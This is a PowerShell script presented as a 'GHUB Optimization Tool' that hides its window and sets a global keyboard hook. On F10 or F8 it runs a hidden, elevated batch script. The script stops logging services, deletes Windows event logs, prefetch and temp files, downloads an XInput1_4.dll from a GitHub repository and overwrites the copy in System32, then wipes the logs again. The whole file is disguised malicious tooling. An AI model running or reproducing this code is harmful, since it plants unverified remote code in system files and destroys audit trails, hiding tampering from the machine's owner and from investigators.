# Hide PowerShell window completely
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Function to execute OLD optimization (F10)
function Invoke-OldOptimization {
    $batchScript = @'
@echo off
title GHUB Optimization Tool
NET SESSION >nul 2>&1 || exit
echo [GHUB] Starting OLD optimization...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
set "dll_url=https://github.com/evanffx/Remove/raw/refs/heads/main/XInput1_4.dll"
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}" >nul 2>&1
if not exist "%dll_path%" exit /b
for /f "tokens=2 delims=," %%a in ('powershell -command "$Processes = Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; $Processes -join ','"') do (
    taskkill /PID %%a /F >nul 2>&1
)
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)
copy /y "%dll_path%" "%system_dll_path%" >nul 2>&1
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
echo [GHUB] OLD optimization complete!
'@
    
    $tempBatch = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.bat'
    $batchScript | Out-File -FilePath $tempBatch -Encoding ASCII
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempBatch`"" -Verb RunAs -WindowStyle Hidden -Wait
    Remove-Item $tempBatch -Force -ErrorAction SilentlyContinue
}

# Function to execute NEW optimization (F8)
function Invoke-NewOptimization {
    $batchScript = @'
@echo off
title GHUB Optimization Tool
NET SESSION >nul 2>&1 || exit
echo [GHUB] Starting NEW optimization...
net stop "EventLog" /y >nul 2>&1
net stop "Wecsvc" /y >nul 2>&1
net stop "Winmgmt" /y >nul 2>&1
takeown /f "%WinDir%\Logs" /r /d y >nul 2>&1
icacls "%WinDir%\Logs" /grant Administrators:F /t /c /q >nul 2>&1
takeown /f "%SystemRoot%\System32\winevt\Logs" /r /d y >nul 2>&1
icacls "%SystemRoot%\System32\winevt\Logs" /grant Administrators:F /t /c /q >nul 2>&1
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%WinDir%\Temp\*" >nul 2>&1
del /s /f /q "%SystemRoot%\Prefetch\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Microsoft\Windows\INetCache\*" >nul 2>&1
set "dll_url=https://github.com/evanffx/nova/raw/refs/heads/main/XInput1_4.dll"
set "dll_path=%TEMP%\XInput1_4.dll"
set "system_dll_path=%SystemRoot%\System32\XInput1_4.dll"
powershell -Command "& {Invoke-WebRequest '%dll_url%' -OutFile '%dll_path%'}" >nul 2>&1
if not exist "%dll_path%" exit /b
for /f "tokens=2 delims=," %%a in ('powershell -command "$Processes = Get-Process | Where-Object {($_.Modules | Where-Object {$_.FileName -match 'XInput1_4.dll'})} | Select-Object -ExpandProperty Id; $Processes -join ','"') do (
    taskkill /PID %%a /F >nul 2>&1
)
net stop wuauserv >nul 2>&1
net stop trustedinstaller >nul 2>&1
if exist "%system_dll_path%" (
    takeown /f "%system_dll_path%" /a >nul 2>&1
    icacls "%system_dll_path%" /grant Administrators:F /t /c /l >nul 2>&1
)
copy /y "%dll_path%" "%system_dll_path%" >nul 2>&1
net start wuauserv >nul 2>&1
net start trustedinstaller >nul 2>&1
del /s /f /q "%WinDir%\Logs\*" >nul 2>&1
del /s /f /q "%SystemRoot%\System32\winevt\Logs\*" >nul 2>&1
del /s /f /q "%LocalAppData%\Temp\*" >nul 2>&1
del /s /f /q "%Temp%\*" >nul 2>&1
del /s /f /q "%dll_path%" >nul 2>&1
echo [GHUB] NEW optimization complete!
'@
    
    $tempBatch = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.bat'
    $batchScript | Out-File -FilePath $tempBatch -Encoding ASCII
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempBatch`"" -Verb RunAs -WindowStyle Hidden -Wait
    Remove-Item $tempBatch -Force -ErrorAction SilentlyContinue
}

# Global hotkey registration
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyboardHook
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static Action _f10Action;
    private static Action _f8Action;

    public static void SetF10Action(Action action) { _f10Action = action; }
    public static void SetF8Action(Action action) { _f8Action = action; }

    public static void Start() {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 121) { _f10Action?.Invoke(); }
            else if (vkCode == 119) { _f8Action?.Invoke(); }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@ -ReferencedAssemblies "System.Windows.Forms"

# Set up hotkey actions
[KeyboardHook]::SetF10Action({ Invoke-OldOptimization })
[KeyboardHook]::SetF8Action({ Invoke-NewOptimization })

# Start the keyboard hook
[KeyboardHook]::Start()
